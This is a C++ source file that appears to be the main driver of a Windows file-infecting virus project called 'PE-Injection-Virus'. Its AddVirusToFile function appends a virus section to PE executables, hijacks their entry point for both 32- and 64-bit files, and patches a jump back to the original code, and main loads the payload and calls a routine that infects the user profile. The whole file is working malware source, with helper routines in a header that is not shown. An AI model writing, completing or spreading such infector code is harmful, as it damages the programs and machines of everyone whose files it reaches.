#include "virus/virus.h"

#include <fstream>
#include <filesystem>
#include <vector>

int main();

std::vector<unsigned char> section_data_global;

void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size)
{
    DWORD virus_va_in_target;
    DWORD virus_ra_in_target;

    DWORD target_entry_point = GetEntryPoint(file_data);

    PIMAGE_SECTION_HEADER virus_section_in_target = AddVirusSection(file_data, &file_size, section_data_global.data(), (DWORD)section_data_global.size(), data);

    virus_va_in_target = virus_section_in_target->VirtualAddress;
    virus_ra_in_target = virus_section_in_target->PointerToRawData;

    if (Is64BitExecutable(file_data))
    {
        DWORD entry_point_64bit = 0x28F0;
        SetEntryPoint(file_data, virus_va_in_target + entry_point_64bit);
        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 0x2945) = target_entry_point - (virus_va_in_target + 0x2949);
    }
    else
    {
        DWORD entry_point_32bit = 0xca0;
        SetEntryPoint(file_data, virus_va_in_target + entry_point_32bit);
        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 0xcdc) = target_entry_point - (virus_va_in_target + 0xce0);
    }

    *(DWORD*)new_file_size = (DWORD)file_size + (DWORD)section_data_global.size();
    return;
}


int main()
{
    std::string virus_path = "E:\\Code\\Github\\PE-Injection-Virus\\virus_code_section";
    std::filesystem::path p{virus_path};
    section_data_global.resize(std::filesystem::file_size(p));
    std::ifstream ifs32(virus_path, std::ios_base::binary);
    ifs32.read((char *)&section_data_global[0], std::filesystem::file_size(p));

    IAT iat;
    DATA data;
    data.iat = &iat;
    GetFunctionAddresses(&data);
    InfectUserProfile(&data);
    return 0;
}